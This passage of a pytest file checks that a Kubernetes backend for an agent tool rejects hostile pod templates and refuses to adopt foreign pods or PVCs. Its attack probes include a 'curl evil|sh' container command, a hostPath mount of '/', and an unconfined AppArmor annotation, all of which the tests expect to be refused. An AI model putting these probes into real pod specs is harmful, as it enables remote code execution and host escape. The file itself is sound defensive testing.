    with pytest.raises(RuntimeError, match="name convention"):
        p.ensure("abc", persistent=False, image="i:1", resources=Resources())


def test_kubernetes_blob_survives_a_backend_selected_by_env_var():
    """terminal.backend ALWAYS defaults to 'local' in the merged config, so the
    round-2 gate's TERMINAL_ENV fallback was dead code: selecting the kubernetes
    backend by environment variable silently dropped the whole
    terminal.kubernetes.* block and the backend ran on DEFAULT_KUBERNETES_CONFIG
    with nothing logged."""
    from hermes_cli.config import apply_terminal_config_to_env

    merged_like = {"terminal": {"backend": "local",
                                "kubernetes": {"namespace": "hermes-agents"}}}
    out = apply_terminal_config_to_env(
        env={"TERMINAL_ENV": "kubernetes"}, config=merged_like, override=False,
    )
    assert json.loads(out["TERMINAL_KUBERNETES"])["namespace"] == "hermes-agents"

    # An EXPLICIT config backend still wins over the ambient env var, so the
    # gate keeps doing its job.
    gated = apply_terminal_config_to_env(
        env={"TERMINAL_ENV": "kubernetes"}, config=merged_like, override=True,
    )
    assert "TERMINAL_KUBERNETES" not in gated


def test_doctor_probes_the_exec_verb_the_client_actually_issues():
    """connect_get_namespaced_pod_exec is a websocket-upgrading GET, authorized
    as verb `get`. Probing `create` failed a truly minimal Role (pushing
    operators to widen it) and passed the kubectl-shaped create-only Role that
    then 403s on the first command.

    Asserted behaviourally, by recording the SelfSubjectAccessReviews doctor
    actually issues — not by reading doctor's source."""
    reviews = _doctor_rbac_reviews(_kcfg(namespace="hermes"))
    assert ("", "pods/exec", "get") in reviews
    assert ("", "pods/exec", "create") not in reviews
    assert ("", "pods", "create") in reviews
    readme = (K8S_DIR / "README.md").read_text(encoding="utf-8")
    assert "get    pods/exec" in readme


def test_doctor_submits_every_access_review_with_strict_field_validation():
    """Requirement 4 says Strict on every create this backend issues. The three
    provisioner creates and both doctor dry-runs carried it; the RBAC probe's
    SelfSubjectAccessReviews did not. A rule with an undocumented carve-out is
    a rule nobody can check, so close the carve-out rather than the rule."""
    reviews = _doctor_rbac_reviews(_kcfg(namespace="hermes",
                                         provisioner="sandbox"))
    assert reviews, reviews
    assert set(reviews.field_validations) == {"Strict"}, reviews.field_validations


def test_doctor_probes_the_sandbox_group_the_backend_posts_to():
    reviews = _doctor_rbac_reviews(
        _kcfg(namespace="hermes", provisioner="sandbox",
              sandbox={"api_group": "custom.example.com"})
    )
    assert ("custom.example.com", "sandboxes", "create") in reviews
    # The sandbox Role deliberately grants no pods create/delete.
    assert ("", "pods", "delete") not in reviews
    assert ("", "pods", "get") in reviews


def _doctor_rbac_reviews(kcfg):
    """Drive _check_kubernetes_backend and record every SSAR it submits."""
    import importlib.util

    import kubernetes.client as kclient
    from hermes_cli import doctor

    class _Seen(list):
        """The recorded (group, resource, verb) triples, plus the
        field_validation each review was submitted with."""
        field_validations: list = []

    seen = _Seen()
    seen.field_validations = []

    class _Attrs:
        def __init__(self, namespace=None, group=None, resource=None, verb=None):
            self.group, self.resource, self.verb = group, resource, verb

    class _Spec:
        def __init__(self, resource_attributes=None):
            self.resource_attributes = resource_attributes

    class _Review:
        def __init__(self, spec=None):
            self.spec = spec

    class _AuthApi:
        def __init__(self, api_client=None):
            pass

        def create_self_subject_access_review(self, review, **kwargs):
            attrs = review.spec.resource_attributes
            seen.append((attrs.group, attrs.resource, attrs.verb))
            seen.field_validations.append(kwargs.get("field_validation"))
            return SimpleNamespace(status=SimpleNamespace(allowed=True))

    core = MagicMock()
    original = {
        "V1ResourceAttributes": getattr(kclient, "V1ResourceAttributes", None),
        "V1SelfSubjectAccessReviewSpec": getattr(
            kclient, "V1SelfSubjectAccessReviewSpec", None),
        "V1SelfSubjectAccessReview": getattr(
            kclient, "V1SelfSubjectAccessReview", None),
        "AuthorizationV1Api": getattr(kclient, "AuthorizationV1Api", None),
    }
    kclient.V1ResourceAttributes = _Attrs
    kclient.V1SelfSubjectAccessReviewSpec = _Spec
    kclient.V1SelfSubjectAccessReview = _Review
    kclient.AuthorizationV1Api = _AuthApi

    import tools.environments.kubernetes as k8s_mod
    import tools.terminal_tool as tt

    saved = (importlib.util.find_spec, k8s_mod.load_kubernetes_apis,
             tt._get_env_config, doctor._dry_run_pod_template)
    try:
        importlib.util.find_spec = lambda name, *a, **k: (
            object() if name == "kubernetes" else saved[0](name, *a, **k)
        )
        k8s_mod.load_kubernetes_apis = lambda cfg: (core, MagicMock())
        tt._get_env_config = lambda: {"kubernetes": kcfg}
        doctor._dry_run_pod_template = lambda *a, **kw: None
        doctor._check_kubernetes_backend([])
    finally:
        (importlib.util.find_spec, k8s_mod.load_kubernetes_apis,
         tt._get_env_config, doctor._dry_run_pod_template) = saved
        for name, value in original.items():
            if value is None:
                delattr(kclient, name)
            else:
                setattr(kclient, name, value)
    return seen


def test_doctor_dry_runs_the_rendered_pod_with_strict_field_validation():
    """Without Strict, an unknown field in pod_template is accepted with 201 and
    silently dropped — the python client throws away the API server's
    "Warning: 299 - unknown field" header, so Warn is indistinguishable from
    success. doctor submits the real rendered pod as a dry-run create so the
    server names the offending path here, not at the first session."""
    from hermes_cli import doctor

    core = MagicMock()
    doctor._dry_run_pod_template(_kcfg(), "hermes", core, False, [])

    kwargs = core.create_namespaced_pod.call_args.kwargs
    assert kwargs["dry_run"] == "All"
    assert kwargs["field_validation"] == "Strict"
    assert kwargs["body"]["kind"] == "Pod"
    assert kwargs["body"]["spec"]["containers"][0]["command"] == ["sleep", "infinity"]


def test_doctor_reports_an_unrenderable_pod_template_as_a_failure():
    from hermes_cli import doctor

    issues: list[str] = []
    doctor._dry_run_pod_template(
        _kcfg(pod_template={"spec": {"restartPolicy": "Always"}}),
        "hermes", MagicMock(), False, issues,
    )
    assert any("pod_template" in issue for issue in issues), issues


# ---------------------------------------------------------------------------
# The reserved core is a property of the SUBMITTED artifact
# ---------------------------------------------------------------------------
#
# Round 4 found the fourth way into the same protection (two containers entries
# named `workspace`: the input-side check read the first, the merge applied the
# second, and the merge collapsed them so the API server saw no duplicate). The
# first three were closed by naming the shape that had just been found. These
# tests are written the other way round, as a contract on the OUTPUT — "no
# pod_template can change the exec container's process" — so a new input shape
# that reaches those fields fails them without anyone having thought of it.


def _exec_contract(template):
    """The reserved core, read off a rendered/submitted pod template."""
    spec = template["spec"]
    containers = [c for c in spec.get("containers") or []
                  if isinstance(c, dict) and c.get("name") == "workspace"]
    assert len(containers) == 1, containers
    container = containers[0]
    return {
        "managed_by": template.get("metadata", {}).get("labels", {}).get(MANAGED_BY),
        "restartPolicy": spec.get("restartPolicy"),
        "command": container.get("command"),
        "args": container.get("args"),
        "workspace_mount": [m for m in container.get("volumeMounts") or []
                            if m.get("mountPath") == "/workspace"],
        "workspace_volume": [v for v in spec.get("volumes") or []
                             if v.get("name") == "workspace"],
    }


def _submitted_templates(kcfg):
    """What each provisioner would actually POST, as pod templates."""
    pod = PodProvisioner(
        kcfg, "hermes", api=None, owner_reference=OWNER_REF,
    ).pod_manifest("abc", persistent=False, image="i:1", resources=Resources())
    sandbox = _sandbox_cls()(
        dict(kcfg, provisioner="sandbox"), "hermes", api=None,
        owner_reference=OWNER_REF, custom_api=None,
    ).sandbox_manifest("abc", persistent=False, image="i:1",
                       resources=Resources())
    return [
        {"metadata": pod["metadata"], "spec": pod["spec"]},
        sandbox["spec"]["podTemplate"],
    ]


#: Templates that AIM at the reserved core, by every route we can think of —
#: and the point of the contract below is that the list does not have to be
#: complete for the guarantee to hold.
_CORE_PROBES = [
    # The plain form.
    {"spec": {"containers": [{"name": "workspace", "command": ["curl", "evil"]}]}},
    # Round 4: a second entry under the same name. Never judged (the lookup
    # returns the first), fully applied (the merge folds every match into the
    # base entry), and invisible to the API server (one container comes out).
    {"spec": {"containers": [
        {"name": "workspace"},
        {"name": "workspace", "command": ["/bin/sh", "-c", "curl evil|sh"],
         "args": ["x"],
         "volumeMounts": [{"mountPath": "/workspace", "name": "tmp"}]},
    ]}},
    # ...and the same idea spread over three entries, in case one lookup is
    # ever taught about "the last one" instead of "the first one".
    {"spec": {"containers": [
        {"name": "workspace"},
        {"name": "workspace", "args": ["--boom"]},
        {"name": "workspace"},
    ]}},
    # The workspace mount, repointed at another volume.
    {"spec": {"containers": [{"name": "workspace", "volumeMounts": [
        {"name": "tmp", "mountPath": "/workspace"}]}]}},
    # The workspace volume itself.
    {"spec": {"volumes": [{"name": "workspace", "hostPath": {"path": "/"}}]}},
    {"spec": {"volumes": [{"name": "workspace", "emptyDir": {}},
                          {"name": "workspace", "hostPath": {"path": "/"}}]}},
    # The exec container's NAME, claimed by another list. Kubernetes requires
    # names to be unique across all three, and exec_container() resolves the
    # session's process by that name against the running pod.
    {"spec": {"initContainers": [{"name": "workspace", "image": "busybox"}]}},
    {"spec": {"restartPolicy": "Always"}},
    {"metadata": {"labels": {MANAGED_BY: "Helm"}}},
    {"metadata": {"ownerReferences": [{"uid": "attacker"}]}},
]

#: Templates that must keep working: the reserved core is a handful of fields,
#: not "pod_template is read-only".
_CLEAN_PROBES = [
    {},
    {"spec": {"runtimeClassName": "kata"}},
    {"spec": {"containers": [{"name": "workspace"},
                             {"name": "sidecar", "image": "envoy"}]}},
    {"spec": {"containers": [{"name": "workspace", "env": [
        {"name": "A", "value": "1"}]}]}},
    {"spec": {"volumes": [{"name": "cache", "emptyDir": {}}],
              "containers": [{"name": "workspace", "volumeMounts": [
                  {"name": "cache", "mountPath": "/cache"}]}]}},
    {"metadata": {"labels": {"team": "hermes"}}},
]


@pytest.mark.parametrize("pod_template", _CORE_PROBES + _CLEAN_PROBES)
def test_no_pod_template_can_change_the_exec_containers_contract(pod_template):
    """THE contract, stated on the artifact rather than on the input.

    For ANY pod_template, one of exactly two things is true:

      * the config is refused — by the validator, by the renderer, and by both
        provisioners' manifest builders — and the judge fails closed, so nothing
        is submitted and the approval guards stay on; or
      * it renders, and the pod both provisioners POST still carries Hermes'
        exec contract byte for byte: the managed-by label, restartPolicy: Never,
        exactly one `workspace` container running `sleep infinity` with no args,
        the workspace mount at mount_path, and the workspace volume.

    There is no third outcome in which a template is accepted and the submitted
    pod differs — which is what "duplicate the container name" bought at HEAD.
    """
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    kcfg = _kcfg(pod_template=pod_template)
    problems = validate_kubernetes_config(kcfg)
    if problems:
        with pytest.raises(ValueError):
            render_pod_template(kcfg, persistent=False, image="i:1",
                                resources=Resources(), pvc_name="pvc")
        with pytest.raises(ValueError):
            _submitted_templates(kcfg)
        # Fail closed: an unvalidated violating config must not earn the skip.
        assert unhardened_reasons(kcfg)
        assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
        return

    reference = _exec_contract(render_pod_template(
        _kcfg(), persistent=False, image="i:1", resources=Resources(),
        pvc_name="pvc",
    ))
    for submitted in _submitted_templates(kcfg):
        assert _exec_contract(submitted) == reference, submitted


def test_every_core_probe_is_actually_refused():
    """Guards the test above against becoming vacuous: each hostile probe must
    take the REFUSED branch, not the "renders cleanly" one."""
    for pod_template in _CORE_PROBES:
        assert validate_kubernetes_config(_kcfg(pod_template=pod_template)), (
            pod_template
        )
    for pod_template in _CLEAN_PROBES:
        assert validate_kubernetes_config(_kcfg(pod_template=pod_template)) == [], (
            pod_template
        )


def test_the_reserved_core_is_judged_on_the_rendered_template():
    """The enforcement point takes (base, rendered) and compares them, so it
    does not depend on knowing which input shape produced the difference. Handed
    a rendered template that a hypothetical future merge quirk had tampered
    with, it still reports every reserved field."""
    from tools.environments.kubernetes import (
        _hardened_base,
        rendered_reserved_violations,
    )

    kcfg = _kcfg()
    base = _hardened_base(kcfg, persistent=False, image="i:1",
                          resources=Resources(), pvc_name="pvc")
    assert rendered_reserved_violations(
        base, base, container_name="workspace", mount_path="/workspace"
    ) == []

    tampered = json.loads(json.dumps(base))
    container = tampered["spec"]["containers"][0]
    container["command"] = ["curl", "evil"]
    container["args"] = ["x"]
    container["volumeMounts"][0] = {"name": "tmp", "mountPath": "/workspace"}
    tampered["spec"]["restartPolicy"] = "Always"
    tampered["spec"]["volumes"][0] = {"name": "workspace",
                                      "hostPath": {"path": "/"}}
    tampered["metadata"]["labels"][MANAGED_BY] = "Helm"
    tampered["metadata"]["ownerReferences"] = [{"uid": "attacker"}]
    problems = rendered_reserved_violations(
        base, tampered, container_name="workspace", mount_path="/workspace"
    )
    for expected in ("command", "args", "volumeMounts[mountPath=/workspace]",
                     "restartPolicy", "volumes[name=workspace]",
                     "metadata.labels", "ownerReferences"):
        assert any(expected in p for p in problems), (expected, problems)

    # A second container with the reserved name is not a merge question at all
    # at this layer: the artifact declares two, which is invalid, so it is
    # refused whether or not anything folded them together.
    doubled = json.loads(json.dumps(base))
    doubled["spec"]["containers"].append({"name": "workspace"})
    assert any("2 containers named" in p for p in rendered_reserved_violations(
        doubled, doubled, container_name="workspace", mount_path="/workspace"))


@pytest.mark.parametrize("pod_template, expected", [
    ({"spec": {"containers": [{"name": "workspace"}, {"name": "workspace"}]}},
     "spec.containers declares 2 entries with name='workspace'"),
    ({"spec": {"containers": [{"name": "a"}, {"name": "a"},
                              {"name": "workspace"}]}},
     "spec.containers declares 2 entries with name='a'"),
    ({"spec": {"initContainers": [{"name": "i"}, {"name": "i"}]}},
     "spec.initContainers declares 2 entries with name='i'"),
    ({"spec": {"volumes": [{"name": "v", "emptyDir": {}},
                           {"name": "v", "emptyDir": {}}]}},
     "spec.volumes declares 2 entries with name='v'"),
    ({"spec": {"imagePullSecrets": [{"name": "s"}, {"name": "s"}]}},
     "spec.imagePullSecrets declares 2 entries with name='s'"),
    ({"spec": {"containers": [{"name": "workspace", "env": [
        {"name": "A", "value": "1"}, {"name": "A", "value": "2"}]}]}},
     "spec.containers[].env declares 2 entries with name='A'"),
    ({"spec": {"containers": [{"name": "workspace", "volumeMounts": [
        {"name": "a", "mountPath": "/x"}, {"name": "b", "mountPath": "/x"}]}]}},
     "spec.containers[].volumeMounts declares 2 entries with mountPath='/x'"),
    ({"spec": {"containers": [{"name": "workspace", "ports": [
        {"containerPort": 80}, {"containerPort": 80}]}]}},
     "spec.containers[].ports declares 2 entries with containerPort=80"),
])
def test_duplicate_keys_in_a_keyed_list_are_rejected(pod_template, expected):
    """Defence in depth behind the rendered-artifact check, not a replacement
    for it. Kubernetes forbids duplicates in every one of these lists; the
    Hermes merge is what HID them, folding each duplicate into one entry — so
    the second entry took effect without ever being read as a second entry."""
    problems = validate_kubernetes_config(_kcfg(pod_template=pod_template))
    assert any(expected in p for p in problems), problems
    with pytest.raises(ValueError):
        render_pod_template(_kcfg(pod_template=pod_template), persistent=False,
                            image="i:1", resources=Resources(), pvc_name="pvc")


def test_duplicate_rejection_does_not_flag_distinct_entries():
    assert validate_kubernetes_config(_kcfg(pod_template={"spec": {
        "containers": [
            {"name": "workspace", "env": [{"name": "A", "value": "1"},
                                          {"name": "B", "value": "2"}],
             "ports": [{"containerPort": 80}, {"containerPort": 443}]},
            {"name": "sidecar"},
        ],
        "volumes": [{"name": "a", "emptyDir": {}}, {"name": "b", "emptyDir": {}}],
    }})) == []


def test_nulling_a_hardened_default_is_visible_to_the_judge():
    """The merge faithfully applies an explicit null, so
    `securityContext.seccompProfile: null` DELETES the base's RuntimeDefault and
    submits a pod with no seccomp floor. The judge read the value only when it
    was present, so the deletion was the one relaxation it could not see — and
    the pod kept the approval skip."""
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    kcfg = _kcfg(pod_template={"spec": {"securityContext": {
        "seccompProfile": None}}})
    reasons = unhardened_reasons(kcfg)
    assert any("seccompProfile" in r for r in reasons), reasons
    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
    # ...and the null really is submitted, so this is not a theoretical worry.
    template = render_pod_template(kcfg, persistent=False, image="i:1",
                                   resources=Resources(), pvc_name="pvc")
    assert template["spec"]["securityContext"]["seccompProfile"] is None
    # The default still earns the skip.
    assert unhardened_reasons(_kcfg()) == []


def test_pod_annotations_are_judged():
    """metadata.annotations is copied verbatim into the submitted template. The
    deprecated AppArmor annotation is a metadata KEY, so the appArmorProfile
    securityContext check never sees it, and the Kata family reconfigures the
    very VM the Kata runtime is being deployed for."""
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    kcfg = _kcfg(pod_template={"metadata": {"annotations": {
        "container.apparmor.security.beta.kubernetes.io/workspace": "unconfined",
        "io.katacontainers.config.hypervisor.enable_iommu": "true",
    }}})
    reasons = unhardened_reasons(kcfg)
    assert any("apparmor" in r for r in reasons), reasons
    assert any("katacontainers" in r for r in reasons), reasons
    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
    # An ordinary annotation is not noise.
    assert unhardened_reasons(_kcfg(pod_template={"metadata": {
        "annotations": {"team": "hermes"}}})) == []


@pytest.mark.parametrize("overrides, expected", [
    ({"sandbox": "oops"}, "terminal.kubernetes.sandbox must be a mapping"),
    ({"volume": "oops"}, "terminal.kubernetes.volume must be a mapping"),
    ({"provisioner": "sandbox", "sandbox": {"spec": "oops"}},
     "terminal.kubernetes.sandbox.spec must be a mapping"),
])
def test_a_non_mapping_block_is_a_message_not_a_crash(overrides, expected):
    """The validator's whole job is turning this into a sentence. It indexed
    `(kcfg.get("volume") or {}).get(...)` instead, so a scalar there made the
    validator itself raise AttributeError, and a scalar sandbox.spec was
    invisible to validator and judge alike before dying as a bare TypeError
    inside the CR builder."""
    kcfg = _kcfg(**overrides)
    problems = validate_kubernetes_config(kcfg)
    assert any(expected in p for p in problems), problems


def test_a_non_mapping_sandbox_spec_is_not_hardened_and_is_not_posted():
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    kcfg = _kcfg(provisioner="sandbox", sandbox={"spec": "oops"})
    assert any("sandbox.spec" in r for r in unhardened_reasons(kcfg))
    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
    with pytest.raises(ValueError, match="sandbox.spec"):
        _sandbox_cls()(
            kcfg, "hermes", api=None, owner_reference=OWNER_REF, custom_api=None,
        ).sandbox_manifest("abc", persistent=False, image="i:1",
                           resources=Resources())


def test_a_reviewed_sandbox_key_is_reviewed_in_ITS_SHAPE_only():
    """`ttlSeconds` is exempt because a TTL can only SHORTEN the workspace's
    life — a claim about an integer, not about a name. Allowlisting the name
    whatever it holds let an arbitrary object ride into the submitted CR
    unjudged."""
    from tools.environments.kubernetes import unhardened_reasons

    assert unhardened_reasons(_sandbox_kcfg(spec={"ttlSeconds": 600})) == []
    for bad in ({"sandboxTemplateRef": {"name": "evil"}}, "600", True):
        reasons = unhardened_reasons(_sandbox_kcfg(spec={"ttlSeconds": bad}))
        assert any("ttlSeconds" in r for r in reasons), (bad, reasons)


# ---------------------------------------------------------------------------
# Refusing to adopt is refusing to delete
# ---------------------------------------------------------------------------


def test_refusing_to_adopt_a_foreign_pod_does_not_delete_it():
    """The read side was guarded and the write side was not: ensure() raised
    "not created by this Hermes instance", KubernetesEnvironment.__init__ caught
    it and ran its cleanup path, which rebuilds the SAME conventional name and
    deletes it. The refusal has to bind both directions."""
    from kubernetes.client.exceptions import ApiException

    api = MagicMock()
    api.create_namespaced_pod.side_effect = ApiException(status=409)
    api.read_namespaced_pod.return_value = _running_pod(
        labels={MANAGED_BY: "hermes-agent"},
        owners=[SimpleNamespace(uid="SOMEONE-ELSE")],
    )
    provisioner = _provisioner_with_api(api)

    # Driven through the real environment constructor, which is where the
    # cleanup path lives.
    with pytest.raises(RuntimeError, match="not created by this Hermes instance"):
        KubernetesEnvironment(
            provisioner=provisioner, task_id="abc", persistent=False,
            image="i:1", api=api, sync_files=False,
        )
    api.delete_namespaced_pod.assert_not_called()


def test_an_unreadable_pod_is_not_deleted_either():
    """`except ApiException: return False` turned a 403 on `get pods` (or any
    transient API error) into "not ours" — and the cleanup path then deleted the
    agent's own live persistent workspace. Unreadable is its own answer, and it
    fails closed in BOTH directions."""
    from kubernetes.client.exceptions import ApiException

    api = MagicMock()
    api.create_namespaced_pod.side_effect = ApiException(status=409)
    api.read_namespaced_pod.side_effect = ApiException(status=403, reason="Forbidden")
    p = _provisioner_with_api(api)

    with pytest.raises(RuntimeError, match="ownership could not be read"):
        p.ensure("abc", persistent=False, image="i:1", resources=Resources())
    p.destroy(PodRef("hermes", p.workspace_name("abc"), "workspace"),
              persistent=False)
    api.delete_namespaced_pod.assert_not_called()


def test_refusing_to_adopt_a_foreign_sandbox_does_not_delete_it():
    """Same shape on the CR path, plus its own extra: destroy() fell back to
    `[pod_ref.pod_name]` precisely when _created_names was empty, which is
    exactly the state _assert_ours leaves behind when it refuses."""
    from kubernetes.client.exceptions import ApiException

    custom = MagicMock()
    custom.create_namespaced_custom_object.side_effect = ApiException(status=409)
    custom.get_namespaced_custom_object.return_value = {
        "metadata": {"uid": "sb", "ownerReferences": [{"uid": "SOMEONE-ELSE"}]},
    }
    api = MagicMock()
    p = _sandbox_provisioner(api=api, custom=custom)

    with pytest.raises(RuntimeError) as excinfo:
        p.ensure("abc", persistent=False, image="i:1", resources=Resources())
    assert "not created by this Hermes instance" in str(excinfo.value)
    # ...and it is called a sandbox, not a "sandboxe".
    assert "sandboxe " not in str(excinfo.value)

    p.destroy(PodRef("hermes", p.workspace_name("abc"), "workspace"),
              persistent=False)
    custom.delete_namespaced_custom_object.assert_not_called()


def test_pvc_adoption_requires_the_whole_hermes_provenance_stamp():
    """The claim is mounted at the agent's cwd and the session-start sync writes
    credential files into it, and its name is deliberately predictable
    (`hermes-ws-<task>`, task ids collapse to "default"). Accepting anything
    that carries ONE well-known label meant anything able to create a labelled
    PVC in the namespace could pre-create the claim and be handed those files.

    What is checkable here is provenance, not identity — the claim carries no
    ownerReference by design — so the whole stamp is required and a missing one
    fails closed."""
    from kubernetes.client.exceptions import ApiException
    from tools.environments.kubernetes import PVC_INSTANCE_ANNOTATION

    def _refuses(pvc, match):
        api = MagicMock()
        api.read_namespaced_persistent_volume_claim.return_value = pvc
        p = _provisioner_with_api(api)
        with pytest.raises(RuntimeError, match=match):
            p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
        api.create_namespaced_pod.assert_not_called()

    # No Hermes labels at all (round-2 case, still refused).
    _refuses(_hermes_pvc(labels={"owner": "someone-else"}), "not a Hermes workspace")
    # The managed-by label alone — the shape anything with PVC create can make.
    _refuses(_hermes_pvc(labels={MANAGED_BY: "hermes-agent"}, annotations={}),
             "component label")
    # Right labels, but for another task's workspace.
    _refuses(_hermes_pvc(task="someone-elses-task"), "labelled for task")
    # Everything but the provenance stamp: no Hermes agent recorded creating it.
    _refuses(_hermes_pvc(annotations={}), "carries no")

    # A claim Hermes itself created is adopted, and the stamp is what it writes.
    api = MagicMock()
    api.read_namespaced_persistent_volume_claim.return_value = _hermes_pvc()
    api.read_namespaced_pod.return_value = _running_pod()
    p = _provisioner_with_api(api)
    p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
    api.create_namespaced_persistent_volume_claim.assert_not_called()

    api.read_namespaced_persistent_volume_claim.side_effect = ApiException(status=404)
    p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
    body = api.create_namespaced_persistent_volume_claim.call_args.kwargs["body"]
    assert body["metadata"]["annotations"][PVC_INSTANCE_ANNOTATION] == p._instance


def test_pvc_adoption_across_instances_stays_possible_but_is_logged(caplog):
    """Two agents running the same task id SHARE the claim by design (the name
    is task-scoped so a persistent workspace resumes after the agent pod is
    replaced). That must keep working — and must never be silent, because the
    agent's credential files are synced into someone else's workspace."""
    api = MagicMock()
    api.read_namespaced_persistent_volume_claim.return_value = _hermes_pvc(
        instance="another0"
    )
    api.read_namespaced_pod.return_value = _running_pod()
    p = _provisioner_with_api(api)
    with caplog.at_level("WARNING"):
        p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
    assert any("another0" in record.getMessage() for record in caplog.records), (
        caplog.records
    )
